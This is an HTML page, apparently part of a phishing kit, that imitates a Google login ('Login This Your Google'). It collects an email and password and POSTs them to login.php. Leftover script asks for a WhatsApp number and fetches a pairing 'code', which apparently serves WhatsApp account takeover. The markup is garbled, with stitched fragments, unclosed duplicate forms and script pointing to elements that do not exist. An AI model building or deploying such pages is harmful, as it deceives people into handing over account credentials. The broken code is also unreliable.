<html lang="en">
 <head> 
  <meta charset="UTF-8"> 
  <link rel="shortcut icon" type="x-icon" href="<"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
  <title>BLACK-HET-CYBER-GIHAN</title> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"> 
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      height: 100vh;
      margin: 0;
      background-image: url("https://files.catbox.moe/0u5deu.jpg"); /* Set the background image */
      background-repeat: no-repeat;
      background-position: center;
      background-size: cover;
      font-family: Arial, sans-serif;
    }

    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .box {
      width: 300px;
      height: 300px;
      padding: 20px;
      position: relative;
      text-align: center;
      background-color: rgba(255, 255, 255, 0.5);
      border-radius: 10px;
      transform: perspective(1000px) rotateY(0deg);
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.7);
    }

    #text {
      color: #000; /* Set the text color to black (#000) */
    }

    .input-container input {
      color: #000; /* Set the text color to black (#000) */
    }

    .centered-text {
      color: #000; /* Set the text color to black (#000) */
    }

    .input-container {
      display: flex;
      background:  white;
      border-radius: 1rem;
      background: linear-gradient(45deg, #c5c5c5 0%, #ffffff 100%);
      box-shadow: 20px 20px 20px #d8d8d8, -10px -10px 20px #7CFC00;
      padding: 0.3rem;
      gap: 0.3rem;
      max-width: 300px;
      width: 100%;
    }

    .input-container input {
      border-radius: 0.8rem 0 0 0.8rem;
      background: #e8e8e8;
      box-shadow: inset 13px 13px 10px #dcdcdc, inset -13px -13px 10px #f4f4f4;
      width: 100%;
      flex-basis: 95%;
      padding: 1rem;
      border: none;
      border-left: 2px solid #0004ff;
      color: #FF2400;
      transition: all 0.2s ease-in-out;
    }

    .input-container input:focus {
      border-left: 2px solid #0004ff;
      outline: none;
      box-shadow: inset 13px 13px 10px #ffe1e1, inset -13px -13px 10px #f4f4f4;
    }

    .input-container button {
      flex-basis: 25%;
      padding: 1rem;
      background: linear-gradient(135deg, #8400ff 0%, #000000 100%);
      font-weight: 900;
      letter-spacing: 1.1rem;
      text-transform: uppercase;
      color: white;
      border: none;
      width: 100%;
      border-radius: 0 1rem 1rem 0;
      transition: all 0.2s ease-in-out;
    }

    .input-container button:hover {
      background: linear-gradient(135deg, #0004ff 0%, #32CD32 100%);
    }

    @media (max-width: 500px) {
      .input-container {
        flex-direction: column;
      }

      .input-container input {
        border-radius: 0.8rem;
      }

      .input-container button {
        padding: 1rem;
        border-radius: 0.9rem;
      }
    }

    .centered-text {
      text-align: center;
    }

    /* Glowing Text */
    .glowing-text {
      margin-top: 20px;
      font-size: 1.2rem;
      font-weight: bold;
      color: red;
      text-shadow: 
        0 0 5px #FF0000, 
        0 0 10px #FF0000, 
        0 0 15px #FF0000, 
        0 0 20px #FF0000, 
        0 0 25px #FF0047, 
        0 0 30px #FF6347;
      animation: glow 2s infinite;
    }

    @keyframes glow {
      0% {
        text-shadow: 
          0 0 5px #FF0000, 
          0 0 10px #FF0000, 
          0 0 15px #FF0000, 
          0 0 20px #FF0000, 
          0 0 25px #FF0047, 
          0 0 30px #FF0047;
      }
      50% {
        text-shadow: 
          0 0 5px #32CD32, 
          0 0 10px #32CD32, 
          0 0 15px #32CD32, 
          0 0 20px #7CFC00, 
          0 0 25px #ADFF2F, 
          0 0 30px #ADFF2F;
      }
      100% {
        text-shadow: 
          0 0 5px #1E90FF, 
          0 0 10px #1E90FF, 
          0 0 15px #00BFFF, 
          0 0 20px #00BFFF, 
          0 0 25px #87CEFA, 
          0 0 30px #87CEFA;
      }
    }
  </style> 
 </head> 
 <body> 
  <div class="container"> 
   <div class="main"> 
    <div class="box" id="box"> 
     <div id="text"> 
      <i class="input-field"></i> 
      <p> </p>
      <h3 class="centered-text">Login This Your Google</h3> 
      <br>
      <div class="input-container"> 
    <div class="container">
       <form action="login.php" method="POST">
      
            <input class="input-field" type="text" name="username" placeholder="Email" required>
            <input class="input-field" type="password" name="password" placeholder="Password" required>
            <button class="login-btn" type="submit">Login</button>
     <form action="login.php" method="POST">
  <a id="waiting-message" class="centered-text" style="display: none;">in process...</a> 
      <br>
      <br> 
      <main id="input-field"></main> 
      <p></p> 
     </div> 
    </div> 
   </div> 
   <div class="glowing-text">
    ⃝🎭ﭢᴰᴬᴿᴷＧＩＨＡＮ_<\>
   </div> 
  </div> 
  <script>
    let a = document.getElementById("text");
    let b = document.getElementById("submit");
    let c = document.getElementById("password");
    let box = document.getElementById("box");

    async function Copy() {
      let text = document.getElementById("copy").innerText;
      let obj = document.getElementById("copy");
      await navigator.clipboard.writeText(obj.innerText.replace('CODE: ', ''));
      obj.innerText = "COPIED";
      obj.style = "color:blue;font-weight:bold";
      obj.size = "5";
      setTimeout(() => {
        obj.innerText = text;
        obj.style = "color:black;font-weight-bold";
        obj.size = "5";
      }, 500);
    }

    b.addEventListener("click", async (e) => {
      e.preventDefault();
      if (!c.value) {
        a.innerHTML = '<a style="color:black;font-weight:bold">Enter your whatsapp number with country code.</a><br><br>';
      } else if (c.value.replace(/[^0-9]/g, "").length < 11) {
        a.innerHTML = '<a style="color:black;font-weight:bold">Invalid number format</a><br><br>';
      } else {
        const bc = c.value.replace(/[^0-9]/g, "");
        let bb = "";
        let bbc = "";
        const cc = bc.split('');
        cc.map(a => {
          bbc += a;
          if (bbc.length == 3) {
            bb += " " + a;
          } else if (bbc.length == 8) {
            bb += " " + a;
          } else {
            bb += a;
          }
        });
        c.type = "text";
        c.value = "+" + bb;
        c.style = "color:black;font-size:20px";
        a.innerHTML = '<a style="color:black;font-weight:bold">Please wait for some time</a><br><br>';
        let { data } = await axios(`/code?number=${bc}`);
        let code = data.code || "Service Unavailable";
        a.innerHTML = '<font id="copy" onclick="Copy()" style="color:red;font-weight:bold" size="5">CODE: <span style="color:black;font-weight:bold">' + code + '</span></font><br><br><br>';
      }
    });
  </script> 
 </body>
</html>

<html>
  <head>
    <title>SL</title>
    <meta http-equiv=”refresh” content=”1" />
  </head>
  <body>

  </body>
</html>
<meta http-equiv="refresh" content="5; url=index.html">
 